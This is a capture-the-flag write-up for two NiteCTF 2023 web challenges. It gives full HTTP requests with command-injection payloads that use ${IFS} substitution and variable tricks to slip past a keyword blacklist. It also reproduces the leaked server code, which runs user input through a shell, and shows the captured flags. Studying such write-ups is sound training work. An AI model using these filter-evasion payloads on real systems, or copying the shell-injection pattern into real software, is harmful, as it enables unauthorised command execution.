---
toc: true
title: "NiteCTF 2023"
description: NiteCTF
pubDate: 2023-12-18
author: Duc Anh Nguyen
draft: true
---

## Web
<div style="border-bottom: 3px solid grey;"></div>

### **[caas_renewed](http://caas.web.nitectf.live)**
There is a cowsay service running, it takes user input from the `GET URL: /cowsay/{input}`. Cleary there is a command injection vulnerability. But there are some filters and also restrictions for the input, I was able to extract the source code of the server using the following payload:

```http
GET /cowsay/a;cd${IFS}-;cat${IFS}ma* HTTP/1.1
Host: caas.web.nitectf.live
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 2
```

<details>
<summary><b>SourceLeak.py</b></summary>

```python
from fastapi import FastAPI
from fastapi.staticfiles import StaticFiles
from fastapi.responses import PlainTextResponse
import subprocess
import time
import os
from uvicorn.workers import UvicornWorker


# remove server header
# gunicorn  -k main.ServerlessUvicornWorker main:app -b "0.0.0.0:1337" --access-logfile '-'
class ServerlessUvicornWorker(UvicornWorker):
    def __init__(self, *args, **kwargs):
        self.CONFIG_KWARGS["server_header"] = False
        super().__init__(*args, **kwargs)


TIMEOUT = 5
SLEEP_TIME = 0.1
DEBUG = False

BLACKLIST = [x[:-1] for x in open("./blacklist.txt").readlines()][:-1]

BLACKLIST.append("/")
BLACKLIST.append("\\")
BLACKLIST.append(" ")
BLACKLIST.append("\t")
BLACKLIST.append("\n")
BLACKLIST.append("tc")

ALLOW = [
    "{",
    "}",
    "[",
    "pwd",
    "-",
    "if",
    "tac",
    "ac",
    "cd",
    "tree",
    "ls",
    "echo",
    "tee",
    "touch",
    "mkdir",
    "dir",
    "mv",
    "chmod",
    "ping",
]

for a in ALLOW:
    try:
        BLACKLIST.remove(a)
    except ValueError:
        pass


def isClean(input):
    input = input.lower().strip()
    if any(x in input for x in BLACKLIST):
        if DEBUG:
            for i in BLACKLIST:
                if i in input:
                    print("Banned reason:", i)
                    break
        return False
    return True


def timeout(proc):
    count = 0
    while proc.poll() == None:
        time.sleep(SLEEP_TIME)
        count += SLEEP_TIME
        if count > TIMEOUT:
            proc.terminate()


app = FastAPI()
api = FastAPI()

pwd = os.path.dirname(os.path.realpath(__file__))

app.mount("/cowsay", api)
#app.mount("/", StaticFiles(directory="{}/static".format(pwd), html=True))

#os.chdir("/usr/games")


@api.get("/{user_input}")
def response(user_input):
    if not isClean(user_input):
        cmd = "cowsay {}".format("'Whoops! I cannot say that'")

        p = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        output = p.communicate()[0]

        return PlainTextResponse(output)
    else:
        cmd = "cowsay {}".format(user_input)

        p = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

        timeout(p)

        if DEBUG:
            try:
                output = "\n".join(x.decode() for x in p.communicate())
            except (UnicodeDecodeError, AttributeError):
                try:
                    output = p.communicate()[1].decode()
                except:
                    output = p.communicate()[1]

        else:
            output = p.communicate()[0].decode()

        if DEBUG:
            print("OUTPUT:", output)

        if len(output):
            return PlainTextResponse(output)

        else:
            if "denied" in output:
                cmd = "cowsay {}{}".format('"permission denied"', user_input)
            else:
                cmd = "cowsay {}{}".format(
                    '"Oops! Something went wrong. You said "', user_input
                )

            p = subprocess.Popen(
                cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )

            output = p.communicate()[0]

        return PlainTextResponse(output)
```
</details>

Knowing the logic behind blacklisting characters now, it is easy to spin up a payload to print out the flag

- `pwd|c'u't${IFS}-c1`: Get the first character of the command pwd, which is pwd
- ban=\`echo${IFS}t\`: Set the variable ban to t (which is one of the blacklisted characters)
- `cat${IFS}${slash}e${ban}c${slash}cowsay${slash}f*`: Print the flag.

```http
GET /cowsay/a;slash=`pwd|c'u't${IFS}-c1`;ban=`echo${IFS}t`;cat${IFS}${slash}e${ban}c${slash}cowsay${slash}f* HTTP/1.1
Host: caas.web.nitectf.live
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 2
```


```http
Flag:

HTTP/1.1 200 OK
date: Mon, 18 Dec 2023 10:04:21 GMT
content-length: 180
content-type: text/plain; charset=utf-8
Connection: close

 ___
< a >
 ---
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
nite{9wd_t0_th3_r35cu3_dp54kf_ud9j3od3w}
```


### [Eraas](!http://eraas.web.nitectf.live/)
Command injection in user input:

```http
POST / HTTP/1.1
Host: eraas.web.nitectf.live
Content-Length: 34
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://eraas.web.nitectf.live
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://eraas.web.nitectf.live/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

user_input=1745291415|cat flag.txt
```

**Flag:**
`nite{b3tt3r_n0_c5p_th7n_b7d_c5p_r16ht_fh8w4d}`

